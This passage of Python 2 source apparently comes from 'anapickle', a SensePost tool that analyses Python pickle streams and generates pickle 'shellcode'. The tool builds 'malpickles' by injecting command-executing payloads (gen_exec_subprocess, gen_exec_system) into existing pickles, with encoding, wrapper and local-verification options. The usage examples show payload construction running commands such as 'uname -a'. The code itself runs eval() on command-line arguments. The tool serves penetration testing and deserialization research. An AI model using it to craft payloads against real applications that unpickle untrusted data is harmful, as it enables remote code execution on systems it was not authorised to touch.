\t\tDon't bug me, just load the damn pickle
\t-z
\t\tMake generated shellcode standalone (adds STOP instruction only). 
\t\tOutput suitable for pickle.load()


Examples:

\tProcess a pickle, extract all entities
\t\tanapicklye.py -f pickle.txt -e

\tProcess a pickle, extract all callables
\t\tanapicklye.py -f pickle.txt -c

\tGenerate shellcode and verify it
\t\tanapickle.py -v -g gen_exec_subprocess "CMD='uname'" "ARGS=['-a']"

\tGenerate shellcode, apply two wrapper functions, make output standalone and write to file:
\t\tanapickle.py  -w strip,int_to_str -o pickle-out2.txt -z -g gen_exec_system "CMD='uname -a'"

\tCreate a malpickle by replacing entity 3 with shellcode
\t\tanapickle.py  -f pickle.txt -x 2 gen_exec_subprocess "CMD='uname'" "ARGS=['-a']"

WARNING: this script uses eval() on command line arguments. Resist all 
temptation to run it with untrusted parameters or pickles.
""")

  def print_usage_and_exit(self):
    self.print_usage()
    exit(1)

  def format_wrappers(self):
    out = "Wrappers:\n"
    for ret_type in Anapickle.wrappers:
      for entry in Anapickle.wrappers[ret_type]:
        out += "\t"+entry["name"]+" -- "+entry["description"]+"\n\n"
    return out


  def format_shellcodes(self):
    out = "Shellcode:\n"
    for ret_type in Anapickle.shellcodes:
      for entry in Anapickle.shellcodes[ret_type]:
        out += "\t"+entry["name"]+" ("+str(len(entry["shellcode"]))+" bytes)"+"  -- "+entry["description"]+"\n"
        out += "\t\treturn:\n\t\t\t"+str(ret_type)+"\n"
        out += "\t\tparams :\n"
        for p in entry["parameters"]:
          out += "\t\t\t"+p["name"]+" ("+str(p["type"]) + "), e.g. "+p["eg"]+"\n"
        out += "\n"
    return out



  def print_shellcodes_and_exit(self):
    print(self.format_shellcodes())
    print(self.format_wrappers())
    exit(1)

  def load_pickle_from_console(self):
    dprint ("Loading pickle from console paste")
    try:
      self.picklestream = sys.stdin.readline()
      while self.picklestream[-2:]!= '.\n':
        self.picklestream += sys.stdin.readline()
      
      if self.base64:
        self.picklestream = base64.b64decode(self.picklestream)

      self.anapickle.picklestream = self.picklestream
    except IOError, e:
      eprint("Error reading console paste : "+Ex.geterr(e))
      sys.exit(1)
    except KeyboardInterrupt, e:
      eprint("Exiting...")
      sys.exit(1)
      

  def load_pickle_from_file(self, filename):
    dprint ("Loading pickle from "+filename)
    try:
      if filename == "-":
        f = sys.stdin
      else:
        f = open(filename)
      self.picklestream = "".join(f.readlines())
      f.close()

      if self.base64:
        self.picklestream = base64.b64decode(self.picklestream)

      self.anapickle.picklestream = self.picklestream
    except IOError, e:
      eprint("Error opening file "+filename+": "+Ex.geterr(e))
      sys.exit(1)

  def verify_pickle(self, picklestream):
    print("")
    print("\nVerifying pickle using 2 tests:\n")

    dprint("verifying stream:\n"+picklestream)
#save output stream
#    saved_output = sys.stdout
    
#    sys.stdout = CaptureStream(self.capture_output)
#    sys.stderr = CaptureStream(self.capture_output)
#    dprint("Output captured")

#try to load it
    test1_passed = False
    test2_passed = False
    try:
      print("Test 1: pickle.loads()")
      iprint("Calling pickle.loads()")
      ret = pickle.loads(picklestream)
      print("")
      iprint("pickle.loads() returned")
      print("Test 1 passed!")
      test1_passed = True
      print("\tReconstructed object is a "+str(type(ret)))
      vprint("\tReconstructed object : "+repr(ret))
    except ValueError, e:
      print("Test 1 failed :(")
      eprint("Pickle had ValueErrors: "+Ex.geterr(e))
      print("\tCould NOT reconstruct object")
      dprint(repr(picklestream))
    except AttributeError, e:
      print("Test 1 failed :(")
      eprint("Pickle had AttributeError: "+Ex.geterr(e))
      print("\tCould NOT reconstruct object")
      dprint(repr(picklestream))
    except subprocess.CalledProcessError, e:
      eprint("Process in shellcode returned non-zero. This may not be a bad thing")
      eprint("Check that any files or commands used in the shellcode exist")
    except OSError, e:
      print("Test 1 failed :(")
      eprint("Shellcode produce an OS-level error: "+Ex.geterr(e))
      eprint("Check that any files or commands used in the shellcode exist")
    except Exception, e:
      eprint("Unknown exception in loads() :"+repr(e))

#now determine whether the pickle produces content on either stdout or stderr
    dprint("Writing picklestream to temp file")
    (fd, path) = tempfile.mkstemp()
    os.write(fd, picklestream)
    os.close(fd)

    try:
      print("Test 2: Capturing stdout/stderr")
      vprint("calling into python subprocess")
      p = subprocess.Popen([sys.executable,'verifier.py',path],bufsize=0, executable=None, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
      print("Test 2 passed!")
      test2_passed = True
    except subprocess.CalledProcessError, e:
      print("Test 2 failed :(")
      eprint("Error in capturing process output: "+Ex.geterr(e))
      
    stdout = p.stdout.readlines()
    stderr = p.stderr.readlines()

    if len(stdout) > 0:
      iprint("Shellcode prints to stdout")
      vprint("Captured stdout:\n"+("".join(stdout)))
      print("\tShellcode produces output on stdout: \n\t\t"+("\t\t".join(stdout)))

    if len(stderr) > 0:
      iprint("Shellcode prints to stderr")
      vprint("Captured stderr:\n"+("".join(stderr)))
      print("\tShellcode produces output on stderr: \n\t\t"+("\t\t".join(stderr)))

    if not (test1_passed and test2_passed):
      print("Verification failed")

    os.remove(path)

  def verify_shellcode(self, shellcode):
    stream = shellcode+"."
    return self.verify_pickle(stream)

  def check_versions(self):
    if not hasattr(subprocess, "check_output"):
      iprint("Your python doesn't support subprocess.check_output. While you can still\n\tgenerate shellcode with this module, you won't be able to verify it")

  def make_shellcode(self):
    call_chain = {"chain" : "SC_PLACE"}

    sc = Anapickle.gen_shellcode(self.substitution_shellcode, self.substitution_shellcode_args)

    if len(self.anapickle.wrappers_list["funcs"]) > 0:
      call_chain = self.anapickle.build_func_call_chain()
      if call_chain["input"] != sc["type"]:
        eprint("Type mismatch between call chain and the shellcode. Shellcode output %s, while the wrappers want %s input" % (str(sc["type"]),str(call_chain["input"])))
        raise Exception("Type mismatch between chain and shellcode")
      sc["type"] = call_chain["output"]

    sc["code"] = call_chain["chain"].replace("SC_PLACE",sc["code"])
    return sc

  def process_args(self, argv):
    try:                                
      opts, leftovers = getopt.getopt(argv, "hf:smilepcavx:d:gyo:w:zubnkr:") 
    except getopt.GetoptError:           
      self.print_usage_and_exit()

    for opt, arg in opts:
      if opt == "-h":
        self.print_usage_and_exit()
      elif opt == "-p":
        self.print_shellcodes_and_exit()
      elif opt == "-f":
        self.filename = arg
      elif opt == "-s":
        self.simulate = True
      elif opt == "-i":
        self.interactive = True
      elif opt == "-g":
        self.generate_shellcode = True
        self.simulate = False
        self.substitution_shellcode = leftovers[0]
        leftovers = leftovers[1:]
        self.substitution_shellcode_args = {}
        if len(leftovers) > 0:
          for i in leftovers:
            kv = i.split("=",1)
            if len(kv) != 2:
              eprint(i+" is a shellcode argument and should have the format KEY=VALUE")
              sys.exit(1)
            try:
              dprint('value = %s'%kv[1])
              self.substitution_shellcode_args[kv[0]]=eval(kv[1])
            except NameError:
              self.substitution_shellcode_args[kv[0]]=eval("\""+kv[1]+"\"")
 
      elif opt == "-l":
        self.call_loads = True
      elif opt == "-c":
        self.print_callables = True 
      elif opt == "-m":
        self.summary = True 
      elif opt == "-e":
        self.return_entities = True
      elif opt == "-v":
        self.verify_loads = True
      elif opt == "-r":
        self.substitute_byte = True
        try:
          self.substitute_byteposition = int(arg)
#65535 is arbitrary, but pickles that size shouldn't occur. if you need to, raise the limit
          if int(arg) < 0 or int(arg) > 65535:
            raise ValueError
        except ValueError:
            eprint("Byte position for -r must be an integer between 0 and 65535, not %s" % (arg))
            sys.exit(1)
        self.substitution_shellcode = leftovers[0]
        leftovers = leftovers[1:]
        self.substitution_shellcode_args = {}
        if len(leftovers) > 0:
          for i in leftovers:
            kv = i.split("=",1)
            if len(kv) != 2:
              eprint(i+" is a shellcode argument and should have the format KEY=VALUE")
              sys.exit(1)
            try:
              self.substitution_shellcode_args[kv[0]]=eval(kv[1])
            except NameError:
              self.substitution_shellcode_args[kv[0]]=eval("\""+kv[1]+"\"")
      elif opt == "-x":
        self.substitute = True
        self.substitution_replacement_entity = []
        for i in arg.split(","):
          try:
            self.substitution_replacement_entity.append(int(i))
          except ValueError:
            eprint("<entity_num> in -x is either an int or a sequence of comma separated ints")
            sys.exit(1)
        self.substitution_shellcode = leftovers[0]
        leftovers = leftovers[1:]
        self.substitution_shellcode_args = {}
        if len(leftovers) > 0:
          for i in leftovers:
            kv = i.split("=",1)
            if len(kv) != 2:
              eprint(i+" is a shellcode argument and should have the format KEY=VALUE")
              sys.exit(1)
            try:
              self.substitution_shellcode_args[kv[0]]=eval(kv[1])
            except NameError:
              self.substitution_shellcode_args[kv[0]]=eval("\""+kv[1]+"\"")
              
      elif opt == "-y":
        self.assume_insecure = True
      elif opt == "-d":
        set_d_level(int(arg))
      elif opt == "-a":
        self.simulate = True
        self.summary = True 
        self.call_loads = True
        self.return_entities = True
      elif opt == "-o":
        try:
          self.stdout = open(arg, "w")
        except IOError, e:
          eprint("Error opening output file: "+Ex.geterr(e))
          sys.exit(1)
      elif opt == "-w":
        for wrapper in arg.split(","):
          try:
            self.anapickle.save_wrapper(wrapper)
          except Exception:
            eprint("Wrapper not found: "+wrapper)
            eprint("Available wrappers are:\n"+self.format_wrappers())
            raise
            sys.exit(1)
      elif opt == "-z":
        self.standalone_output = True
      elif opt == "-u":
        self.pickletools_dis = True
      elif opt == "-b":
        self.urlencode = True
      elif opt == "-k":
        self.pythonencode = True
      elif opt == "-n":
        self.base64 = True
      else:
        eprint("Unknown parameter\n")
   
    dprint("Arguments processed")

  def verify_pickle_by_loading(self):
    if not self.assume_insecure:
      print("\n\nWARNING: this is going to run your exploit locally. y to Continue: "),
      if sys.stdin.readline() != "y\n":
        eprint("Not verifying, exiting")
        sys.exit(1)
    try:
      self.verify_pickle(self.anapickle.picklestream)
    except Exception, e:
      eprint("Error verifying pickle: "+Ex.geterr(e))
      raise

  def write_out_shellcode(self, sc):
    if self.standalone_output:
      sc["code"] += "."

    if self.urlencode:
      sc['code'] = urllib.quote(sc['code'])

    if self.pythonencode:
      sc['code'] = repr(sc['code'])

    if self.base64:
      sc['code'] = base64.b64encode(sc['code'])

    if self.stdout == sys.stdout:
      out = "\nShellcode "+self.substitution_shellcode+" ("+str(len(sc["code"]))+" bytes) returns "+str(sc["type"])+":\n\n>8------------------------------ CUT HERE ------------------------------8<\n"
      out += sc["code"]+"\n>8------------------------------ CUT HERE ------------------------------8<\n"
    else:
      out = sc["code"]

    self.stdout.write(out)
    self.stdout.flush()




  def __init__ (self, argv):
    print("__+------------------------------------------+__\n  |  anapickle - v0.2 - marco@sensepost.com  |\n__+------------------------------------------+__\n")

    self.anapickle = Anapickle()

    self.filename = "-"
    self.simulate = True
    self.print_callables = False
    self.return_entities = False
    self.substitute = False
    self.substitute_byte = False
    self.verify_loads = False
    self.assume_insecure = False
    self.interactive = False
    self.call_loads = False
    self.summary = False
    self.shellcode = None
    self.generate_shellcode = False
    self.captured_output = ""
    self.stdout = sys.stdout
    self.wrappers = []
    self.standalone_output = False
    self.pickletools_dis = False
    self.urlencode = False
    self.pythonencode = False
    self.base64 = False


    self.process_args(argv)

    self.check_versions()

    if self.generate_shellcode and (self.simulate or self.print_callables or self.return_entities or self.substitute or self.substitute_byte or self.call_loads or self.interactive or self.summary):
      eprint(" -g is not compatible with -f, -s, -l, -e, -c, -m, -x or -i")
      sys.exit(1)
    
    if self.interactive:
      self.load_pickle_from_console()
      self.anapickle.sim_pickle()
      print(self.anapickle.format_pickle_summary())
      print(self.anapickle.format_entities())
      
      sys.exit(0)

    if not self.generate_shellcode:
      self.load_pickle_from_file(self.filename)

    if not self.generate_shellcode and (self.simulate or self.print_callables or self.return_entities or self.substitute or self.substitute_byte):
      self.anapickle.sim_pickle()

    if self.anapickle and (self.anapickle.simulator_failed or self.summary):
      print(self.anapickle.format_pickle_summary())

    if self.anapickle and self.return_entities:
      if self.anapickle.simulator_failed:
        eprint("Pickle could not be loaded, bailing...")
        sys.exit(1)
      print(self.anapickle.format_entities())

    if self.anapickle and self.print_callables:
      out = "Callables\n"
      for i in self.anapickle.callables:
        out += "\t"+i[0]+"."+i[1]+"\n"
      print out

    if self.anapickle and self.pickletools_dis:
      pickletools.dis(self.anapickle.picklestream)

    if self.anapickle and self.call_loads:
      dprint("Pickle loading:\n\n")
      r = self.anapickle.load_pickle()
      if r == True:
        iprint("Stream successfully depickled\n")
      else:
        wprint("Pickle could not be loaded!!!\n\n")
        if len(self.anapickle.error_attribute_names) > 0:
          wprint("Attributes not present : ")
          wprint(", ".join(self.anapickle.error_attribute_names)+"\n\n")
        if len(self.anapickle.error_callables) > 0:
          wprint("Callables not present : ")
          wprint(", ".join(self.anapickle.error_callables)+"\n\n")


    if self.substitute or self.substitute_byte:
      if self.anapickle.simulator_failed:
        eprint("Pickle could not be loaded, bailing...")
        sys.exit(1)

      try:

        sc = self.make_shellcode()
       
      except Exception, e:
        eprint(Ex.geterr(e))
        eprint("Shellcode could not be generated, bailing...")
        sys.exit(1)
  
      if self.substitute:
        for replacement in self.substitution_replacement_entity:
          self.anapickle.replace_and_fixup(replacement, sc)
      elif self.substitute_byte:
          self.anapickle.insert_at_byte_position(self.substitute_byteposition, sc['code'])
      else:
          raise Error
      
      sc = { "code" : self.anapickle.picklestream, "type" : "unknown" }

      self.write_out_shellcode(sc)

      if self.summary:
        self.anapickle.sim_pickle()
        print(self.anapickle.format_pickle())
        print(self.anapickle.format_pickle("SlightlyBetter"))
        print(self.anapickle.format_pickle_summary())

      if self.verify_loads:
        self.verify_pickle_by_loading()

    elif self.anapickle.picklestream and self.verify_loads:
      self.verify_pickle_by_loading()
    

    if self.generate_shellcode:
      try:
        sc = self.make_shellcode()
        self.write_out_shellcode(sc)
        if self.verify_loads:
          self.anapickle.picklestream = sc["code"]+"."
          self.verify_pickle_by_loading()
      except Exception, e:
        eprint("Error in shellcode generation: "+Ex.geterr(e))
        raise

def main(argv):
  am = AnapickleManager(argv)
  #Anapickle(pickle_4,loadpickle = True)

if __name__ == "__main__":
  main(sys.argv[1:])

